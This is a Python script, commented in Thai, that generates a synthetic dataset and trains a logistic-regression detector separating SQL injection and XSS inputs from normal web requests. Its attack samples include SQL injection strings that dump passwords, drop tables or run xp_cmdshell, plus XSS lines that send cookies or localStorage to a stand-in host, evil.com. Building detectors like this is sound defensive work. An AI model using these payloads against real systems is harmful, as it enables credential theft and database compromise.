import pandas as pd
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.linear_model import LogisticRegression
from sklearn.model_selection import train_test_split
from sklearn.metrics import classification_report
import joblib
import os
import numpy as np

# ===============================
# 1. สร้าง dataset ตัวอย่าง (10,000 ตัวอย่าง)
# ===============================
import random

def generate_dataset(n_samples=10000):
    payloads = []
    labels = []
    
    tables = ["users", "admin", "students", "products", "orders", "customers"]
    cols = ["id", "username", "password", "email", "status"]
    words = ["hello", "world", "test", "data", "query", "user", "admin", "system", "search", "update"]
    endpoints = ["/index.html", "/api/login", "/about", "/contact", "/dashboard", "/products/1", "/user/profile"]
    
    for _ in range(n_samples // 2):
        # --- Generate Attack ---
        attack_type = random.choice(["sqli", "xss"])
        if attack_type == "sqli":
            t = random.choice(tables)
            c = random.choice(cols)
            w = random.choice(words)
            sqli_patterns = [
                f"SELECT * FROM {t}",
                f"' OR 1=1 --",
                f"{w}' --",
                f"DROP TABLE {t}",
                f"' OR 'a'='a",
                f"1; DROP TABLE {t}--",
                f"' UNION SELECT null, username, password FROM {t}--",
                f"SELECT * FROM information_schema.tables",
                f"'; EXEC xp_cmdshell('dir')--",
                f"1 OR 1=1",
                f"{w}'/*",
                f"') OR ('1'='1",
                f"SELECT {c} FROM {t} WHERE {c}='{w}'",
                f"' OR {c} IS NOT NULL--",
                f"UNION ALL SELECT null,null,null--",
                f"' AND sleep(5)--",
                f"SELECT load_file('/etc/passwd')"
            ]
            payloads.append(random.choice(sqli_patterns))
        else:
            w = random.choice(words)
            xss_patterns = [
                f"<script>alert(1)</script>",
                f"<img src=x onerror=alert(1)>",
                f"<svg onload=alert(1)>",
                f"<body onload=alert('{w}')>",
                f"javascript:alert(1)",
                f"<iframe src=javascript:alert(1)>",
                f"<input onfocus=alert(1) autofocus>",
                f"'\"><script>alert(document.cookie)</script>",
                f"<script>document.location='http://evil.com?c='+document.cookie</script>",
                f"<img src={w} onerror=alert('xss')>",
                f"<div onmouseover=alert(1)>{w}</div>",
                f"<a href=javascript:alert(1)>{w}</a>",
                f"<script>fetch('http://evil.com?data='+localStorage)</script>",
                f"<details open ontoggle=alert(1)>",
                f"<marquee onstart=alert(1)>",
                f"<script>window.location='http://evil.com'</script>",
                f"<object data=javascript:alert(1)>",
                f"<embed src=javascript:alert(1)>",
                f"<button onclick=alert(1)>{w}</button>"
            ]
            payloads.append(random.choice(xss_patterns))
        labels.append("Attack")
        
        # --- Generate Normal ---
        normal_type = random.choice(["text", "url", "param"])
        w1 = random.choice(words)
        w2 = random.choice(words)
        ep = random.choice(endpoints)
        if normal_type == "text":
            normal_patterns = [
                f"{w1} {w2} request",
                f"hello {w1}",
                f"{w1} profile update",
                f"search query {w2}"
            ]
            payloads.append(random.choice(normal_patterns))
        elif normal_type == "url":
            normal_patterns = [
                f"GET {ep} HTTP/1.1",
                f"POST {ep} HTTP/1.1"
            ]
            payloads.append(random.choice(normal_patterns))
        else:
            normal_patterns = [
                f"POST /api/login username={w1}&password=1234",
                f"product id={random.randint(1,1000)}",
                f"user id={random.randint(1,1000)} action=view",
                f"search keyword={w1}",
                f"page={random.randint(1,10)}&limit=10",
                f"filter=price&sort=asc",
                f"category={w1}&brand={w2}",
                f"username={w1}&email={w1}@example.com",
                f"lang=th&theme=dark"
            ]
            payloads.append(random.choice(normal_patterns))
        labels.append("Normal")

    return pd.DataFrame({"payload": payloads, "label": labels})

df = generate_dataset(10000)

print(f"Dataset size : {len(df)} samples")
print(f"Attack       : {len(df[df['label']=='Attack'])}")
print(f"Normal       : {len(df[df['label']=='Normal'])}")
print()

# ===============================
# 2. แปลงข้อความเป็นตัวเลข
# ===============================

vectorizer = TfidfVectorizer(ngram_range=(1, 2))
X = vectorizer.fit_transform(df["payload"])
y = df["label"]

# ===============================
# 3. แบ่ง train/test
# ===============================

X_train, X_test, y_train, y_test = train_test_split(
    X, y, test_size=0.3, random_state=42, stratify=y
)

# ===============================
# 4. เทรนโมเดล
# ===============================

model = LogisticRegression(
    max_iter=1000,
    class_weight={'Attack': 2, 'Normal': 1}  # ให้น้ำหนัก Attack มากขึ้น
)
model.fit(X_train, y_train)

# ===============================
# 5. ทดสอบโมเดล (ปรับ threshold)
# ===============================

# ดึงค่าความน่าจะเป็นของ Attack
classes = list(model.classes_)
attack_index = classes.index("Attack")
y_prob = model.predict_proba(X_test)[:, attack_index]

# threshold = 0.35 → ไวขึ้นกับ Attack (ค่าปกติคือ 0.5)
THRESHOLD = 0.35
y_pred = np.where(y_prob >= THRESHOLD, "Attack", "Normal")

print("=== Model Evaluation (threshold=0.35) ===")
print(classification_report(y_test, y_pred))

# ===============================
# 6. บันทึกไฟล์โมเดล
# ===============================

if not os.path.exists("models"):
    os.makedirs("models")

joblib.dump(model, "models/model.pkl")
joblib.dump(vectorizer, "models/vectorizer.pkl")

# บันทึก threshold ไว้ใช้ใน app.py ด้วย
joblib.dump(THRESHOLD, "models/threshold.pkl")

print("Model, vectorizer and threshold saved successfully.")
print(f"Threshold = {THRESHOLD}")